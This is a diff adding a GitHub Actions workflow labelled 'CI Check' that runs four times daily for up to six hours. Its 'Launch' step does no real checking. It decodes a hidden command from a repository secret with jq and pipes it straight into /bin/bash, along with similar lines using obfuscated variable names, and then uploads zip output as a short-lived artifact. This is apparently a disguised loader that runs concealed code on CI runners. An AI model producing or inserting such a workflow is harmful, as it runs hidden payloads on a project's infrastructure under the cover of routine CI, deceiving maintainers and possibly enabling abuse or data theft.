@@ -1,0 +1,31 @@
+name: CI Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '29 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          z9657: ${{ secrets.z9657 }}
+        run: |
+          printf '%s' "$z9657" | jq -r .c32 | /bin/bash
+          echo $uss0785 | jq -r .sxik0081 | /bin/bash
+          printf '%s' "$wyxu6" | jq -r .alj5169 | /bin/bash
+          printf '%s' "$texd58" | jq -r .ae50 | /bin/bash
+
+      - name: Persist output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: FVwaxjl9
+          path: "*.zip"
+          retention-days: 1
